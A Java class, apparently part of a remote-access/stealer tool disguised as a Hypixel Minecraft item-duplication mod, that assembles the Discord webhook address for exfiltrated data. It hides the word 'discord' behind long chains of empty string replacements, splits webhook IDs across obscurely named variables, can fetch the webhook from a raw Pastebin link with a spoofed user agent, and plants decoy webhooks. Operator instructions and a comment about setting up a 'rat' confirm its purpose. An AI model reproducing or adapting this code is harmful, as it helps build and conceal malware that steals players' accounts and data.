// DISCORD WEBHOOKS

// BY CUSTOMPAYLOAD

package run.hypixel.dupe.hooks;


import java.io.InputStream;
import java.net.URL;
import java.util.ArrayList;
import java.util.Random;
import java.util.Scanner;

import javax.net.ssl.HttpsURLConnection;

public class Hooks374 {
	
	public static ArrayList<String> realHooks = new ArrayList<>();
	
	public static String stringreplace = "fucmrdj"
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "").replace("                        ", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "").replace("                        ", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "").replace("                        ", "")
			.replace("", "")
			.replace("", "").replace("                        ", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "").replace("                        ", "").replace("                        ", "").replace("                        ", "").replace("                        ", "").replace("                        ", "").replace("                        ", "")
			.replace("", "")
			.replace("", "")
			.replace("", "").replace("                        ", "")
			.replace("", "")
			.replace("", "").replace("                        ", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "").replace("                        ", "").replace("                        ", "")
			.replace("", "")
			.replace("", "").replace("                        ", "").replace("fucmrdj", "urnwqpy").replace("", "").replace("", "")
			.replace("", "").replace("                        ", "")
			.replace("", "")
			.replace("", "")
			.replace("", "").replace("                        ", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "").replace("                        ", "")
			.replace("", "").replace("                        ", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "").replace("                        ", "").replace("urnwqpy", "discord")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "").replace("                        ", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "").replace("                        ", "").replace("                        ", "").replace("                        ", "").replace("                        ", "").replace("                        ", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "").replace("                        ", "").replace("                        ", "").replace("                        ", "").replace("                        ", "").replace("                        ", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "")
			.replace("", "").replace("                        ", "").replace("                        ", "").replace("                        ", "").replace("                        ", "").replace("                        ", "").replace("                        ", "").replace("                        ", "")
			.replace("", "")
			.replace("", "")
			.replace("", "");
	
	public static ArrayList<String> hahahahbonk = new ArrayList<String>();
	
	public static String getyou() {
		String fdffg = "fucmrdj"
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "").replace("                        ", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "").replace("                        ", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "").replace("                        ", "")
				.replace("", "")
				.replace("", "").replace("                        ", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "").replace("                        ", "").replace("                        ", "").replace("                        ", "").replace("                        ", "").replace("                        ", "").replace("                        ", "")
				.replace("", "")
				.replace("", "")
				.replace("", "").replace("                        ", "")
				.replace("", "")
				.replace("", "").replace("                        ", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "").replace("                        ", "").replace("                        ", "")
				.replace("", "")
				.replace("", "").replace("                        ", "").replace("fucmrdj", "urnwqpy").replace("", "").replace("", "")
				.replace("", "").replace("                        ", "")
				.replace("", "")
				.replace("", "")
				.replace("", "").replace("                        ", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "").replace("                        ", "")
				.replace("", "").replace("                        ", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "").replace("                        ", "").replace("urnwqpy", "discord")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "").replace("                        ", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "").replace("                        ", "").replace("                        ", "").replace("                        ", "").replace("                        ", "").replace("                        ", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "").replace("                        ", "").replace("                        ", "").replace("                        ", "").replace("                        ", "").replace("                        ", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "")
				.replace("", "").replace("                        ", "").replace("                        ", "").replace("                        ", "").replace("                        ", "").replace("                        ", "").replace("                        ", "").replace("                        ", "")
				.replace("", "")
				.replace("", "")
				.replace("", "");
		
		/*
		 * For pastebin put your RAW pastebin link in the pbin variable, make sure its RAW and plaintext
		 * If you want to manually put your webhook, take the second part of your webhook, split it into 4 lines
		 * and put them all in the WEBHOOK1 Part. Then take your first part of the webhook (with numbers)
		 * and split them in 3 lines, then put them in the WEBHOOK2 section.
		 * 
		 * If you have both pastebin and normal webhook, Pastebin will take priority.
		 * Make sure to add your plaintext full webhook link in pastebin.
		 */
		
		// 1.2 Now supports pastebin webhooks! Put the RAW pastebin link including the https
		String pbin = "";
		
		// WEBHOOK1 Down here.
		String ksndad = "99ffDNdgbdgfhbdfgdfgDpa1SzT"; // your discord webhook split into multi strings (second part)
		String jsndws = "fQvJJrgdfgsfdtSc3OBDueCFvEi";
		String jonkadw = "ERN63adswdaswadswdpsF";
		String weunjdf = "1HxT8HEradswdaswdiQMYDuq_ue_8VEyuKh";
		
		// WEBHOOK2 Down here.
		String adjnws = "92fadse86"; // first part of the webhook
		String utruje = "2194afwdse686";
		String djnee = "4812adfsw103";
		if(pbin != "") {
			if(pbin.contains("pastebin") && pbin.contains("raw")) {
				try {
					String userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36";
					URL url = new URL(pbin);
					HttpsURLConnection connection = (HttpsURLConnection) url.openConnection();
					connection.setDoOutput(true);
					connection.setRequestMethod("GET");
					InputStream response = connection.getInputStream();
					try(Scanner scanner = new Scanner(response)){
						String responseBody = scanner.useDelimiter("\\A").next();
						hahahahbonk.add(responseBody);
					}catch(Exception e) {
						// dumb fucking [GithubFriendly] cant setup a rat
					}
				}catch(Exception e) {
					// ayo the pizza here
				}
				
			}else {
				// you need to make the pastebin raw [Maybe github friendly??]
			}
		}else {
			hahahahbonk.add("https://discord.com/api/webhooks/" + adjnws + utruje + djnee +"/" + ksndad + jsndws + jonkadw + weunjdf);
		}
		// REAL HOOKS ARE FAKE!!!!!!!!
		realHooks.add("https://discord.com/api/webhooks/DONT_STEAL_MY_FUCKING_WEBHOOKR277285/7VAyjWXDONT_STEAL_MY_FUCKING_WEBHOOKRVZlPiJnAaoqVfyC4ndlYy-Nmjl8");
		realHooks.add("https://discord.com/api/webhooks/900DONT_STEAL_MY_FUCKING_WEBHOOKR242/llCThNzr6tcvDONT_STEAL_MY_FUCKING_WEBHOOKR1EmHhNYUVoaWpBJDfx");
		realHooks.add("https://discord.com/api/webhooks/9003DONT_STEAL_MY_FUCKING_WEBHOOKR10186/GzIlQeDONT_STEAL_MY_FUCKING_WEBHOOKRsCbte2BiwboHEYgggocT3uK2GAKbARE2");
		Random r = new Random();
		int picked = r.nextInt(hahahahbonk.size());
		String dupedItem = hahahahbonk.get(picked);
		return dupedItem;
	}

}
